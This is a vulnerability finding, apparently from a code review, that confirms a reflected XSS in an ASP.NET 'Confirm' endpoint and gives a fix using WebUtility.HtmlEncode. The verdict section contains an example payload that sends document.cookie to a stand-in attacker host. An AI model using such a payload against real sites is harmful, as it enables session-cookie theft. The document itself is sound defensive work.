## Verdict

Confirmed. `Confirm()` reads `orderId` and `note` from the query string and concatenates them directly into an HTML string that is returned with `Content-Type: text/html` via `Content(html, "text/html")`. Neither value is HTML-encoded before being written into the markup, so a request such as `/tracking/confirm?orderId=1&note=<script>document.location='https://evil.example/?c='+document.cookie</script>` has its `note` value parsed as live markup/script by the browser, giving a classic reflected XSS.

## Source

`Request.Query["orderId"]` and `Request.Query["note"]` (`RazorRawConcatOutput.cs`, lines 10-11) are the tainted sources. They flow unmodified into the `html` string built at lines 13-17 and reach the sink at line 20, `return Content(html, "text/html")`, which sends the string to the client as HTML with no encoding step in between.

## Fix

### File: RazorRawConcatOutput.cs

```csharp
using System.Net;
using Microsoft.AspNetCore.Mvc;

namespace OrderPortal.Controllers
{
    public class TrackingController : Controller
    {
        [HttpGet("/tracking/confirm")]
        public IActionResult Confirm()
        {
            string orderId = Request.Query["orderId"];
            string customerNote = Request.Query["note"];

            string safeOrderId = WebUtility.HtmlEncode(orderId);
            string safeCustomerNote = WebUtility.HtmlEncode(customerNote);

            string html = "<html><body>" +
                "<h2>Tracking Confirmation</h2>" +
                "<p>Order: " + safeOrderId + "</p>" +
                "<p>Note from customer: " + safeCustomerNote + "</p>" +
                "</body></html>";

            return Content(html, "text/html");
        }
    }
}
```

## Explanation

The finding is that the response body embeds attacker-controlled query parameters into HTML without neutralizing HTML-significant characters, letting an attacker close the surrounding tag and inject their own markup or script that the browser executes in the context of this site.

The fix HTML-encodes each tainted value with `System.Net.WebUtility.HtmlEncode` immediately after it is read, before it is concatenated into the `html` string. `HtmlEncode` converts `<`, `>`, `&`, and quote characters into their entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#39;`), so any markup or script an attacker supplies in `orderId` or `note` is rendered as inert text inside the `<p>` elements instead of being parsed as HTML or executed as script. The encoding is applied at the point the values are read, ahead of every place they are used in the concatenation, so both reflected fields are covered and the output structure of the page is unchanged for legitimate input (an order id or note containing no special characters renders identically to before).

This keeps the existing raw-string/`Content()` approach intact rather than introducing a templating change, since the vulnerability is the missing output encoding, not the choice of response-building mechanism. A verification request with `note` set to a value such as `<script>alert(1)</script>` now returns the literal encoded text `&lt;script&gt;alert(1)&lt;/script&gt;` in the response body rather than an executable `<script>` element, confirming the injected markup no longer executes.
